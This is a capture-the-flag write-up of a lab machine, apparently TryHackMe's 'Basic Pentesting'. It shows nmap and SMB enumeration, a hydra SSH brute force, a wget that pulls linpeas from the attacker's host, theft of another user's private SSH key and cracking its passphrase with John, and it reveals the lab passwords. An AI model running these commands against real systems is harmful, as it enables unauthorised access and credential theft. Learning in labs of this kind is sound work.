# Basic Pentesting

> RedAiden

## Enumeration

### Nmap

We start with a simple Nmap scan.

`nmap -sC -sV 10.10.108.111`
```
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy
| fingerprint-strings: 
|   LANDesk-RC: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Mon, 11 Jan 2021 07:43:08 GMT
|     Connection: close
|_http-favicon: Apache Tomcat                                                                                                                              
|_http-open-proxy: Proxy might be redirecting requests                                                                                                     
|_http-title: Apache Tomcat/9.0.7

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-01-11T02:43:09-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-11T07:43:09
|_  start_date: N/A
```



### gobuster

Since we know it has a web server, we can run gobuster to find hidden directories

`gobuster dir -u 10.10.108.111 -w /usr/share/wordlists/dirb/common.txt`
```
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/development (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
```

### Exploring the site

- We can find two text files in the `/development` directory: `dev.txt` and `j.txt`. 
  - `dev.txt` talks about using Apache struts version 2.5.12 and that smb and apache have been configured
  - `j.txt` is a letter to the user `J` from `K` to inform him of his weak password, because it can be cracked really easily.

### enum4linux

Since we know that smb is configured, we can use `enum4linux` to gain additional information.

`/usr/share/enum4linux/enum4linux.pl -a 10.10.108.111`
```
 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.108.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.108.111    |
 ===================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================= 
|    Nbtstat Information for 10.10.108.111    |
 ============================================= 
Looking up status of 10.10.108.111
        BASIC2          <00> -         B <ACTIVE>  Workstation Service
        BASIC2          <03> -         B <ACTIVE>  Messenger Service
        BASIC2          <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.108.111    |
 ====================================== 
[+] Server 10.10.108.111 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.108.111    |
 ============================================ 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.108.111    |
 ======================================= 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.108.111 from smbclient: 
[+] Got OS info for 10.10.108.111 from srvinfo:
        BASIC2         Wk Sv PrQ Unx NT SNT Samba Server 4.3.11-Ubuntu
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ========================================== 
|    Share Enumeration on 10.10.108.111    |
 ========================================== 

        Sharename       Type      Comment
        ---------       ----      -------
        Anonymous       Disk      
        IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.108.111
//10.10.108.111/Anonymous       Mapping: OK, Listing: OK
//10.10.108.111/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.108.111    |
 ===================================================== 


[+] Attaching to 10.10.108.111 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BASIC2
        [+] Builtin

[+] Password Info for Domain: BASIC2

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 ======================================================================== 
|    Users on 10.10.108.111 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
[+] Enumerating users using SID S-1-5-21-2853212168-2008227510-3551253869 and logon username '', password ''
```

From here we found out two possible usernames `kay` and `jan`. From the letter we know Jan's password is pretty weak, so we can try to brute force it using hydra.

### smbclient

1. We can connect to the smb service with `smbclient //10.10.x.x/Anonymous` into the anonymous share by just pressing enter when asked for a password. 
2. Run `ls` to see all available files. There's only one called `staff.txt`
3. Download the file with `get staff.txt`
4. On your machine, read the file. It should say this:
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
With this, we can add another user to the list: `kay`,`jan` and `jay`

### hydra

Let's brute force jan's password first, since he is the one getting scolded in the announcement.

`hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.x.x`

- `-l` to specify the user
- `-P` to specify the password list
- `ssh://` to specify the service we want to attack. From the Nmap scan we know that ssh is open.
```
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.14.68:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active
[STATUS] 134.67 tries/min, 404 tries in 00:03h, 14343998 to do in 1775:15h, 16 active
[22][ssh] host: 10.10.14.68   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

From this we now know the passfor for the user Jan, which is `armando`.

### ssh

Login to ssh with username `jan` and supplying `armando` as password. `ssh jan@10.10.x.x`

We are in!

### linpeas

We can speed up our enumeration process with linpeas or LinEnum, in this case I used linpeas. You can use any technique you want to upload it to the machine. I used a simple http python server to upload the file:

1. On your machine, run `python3 -m http.server 8000` inside the folder with the linpeas script
2. On the victim machine, navigate to `/tmp` to download the script 
3. Download the script with `wget http://YOUR_IP:8000/linpeas.sh`
4. Mark the script as executable `chmod +x linpeas.sh`
5. Run the script `./linpeas.sh`

From all the output, we can see a private ssh key for the user kay.

```
[+] Searching ssl/ssh files
/home/kay/.ssh/authorized_keys                                                                                                                             
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
 --> /etc/hosts.allow file found, read the rules:
/etc/hosts.allow

[+] Searching uncommon passwd files (splunk)
passwd file: /etc/cron.daily/passwd                                                                                                                        
passwd file: /etc/pam.d/passwd
passwd file: /usr/bin/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd
```

1. Read the file so we can copy its contents `cat /home/kay/.ssh/id_rsa`
2. Copy the file and copy its contents in a new file on your machine

If we try and login with this file, we are going to be asked for a passphrase, which we dont know, but we can try and crack it using JohnTheRipper.

### JohnTheRipper

1. Use `ssh2john` to change the contents of the file into something that JohnTheRipper can read. `/usr/share/john/ssh2john.py id_rsa > hash`
1. Use JohnTheRipper to crack the password. `sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash`
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)
1g 0:00:00:00 DONE (2021-01-11 15:40) 1.075g/s 2694Kp/s 2694Kc/s 2694KC/s  abrxbt.a6_123
Session completed
```

And we got a hit! We can now login to kay's account.

### ssh (kay)

First, change the file permissions of the key so ssh doesn't yell at us. `chmod 600 id_rsa`

`ssh kay@10.10.x.x -i id_rsa`

Passphrase: `beeswax`

### Finding the flag

Once you're in, run `ls` to find your flag file. `cat pass.bak`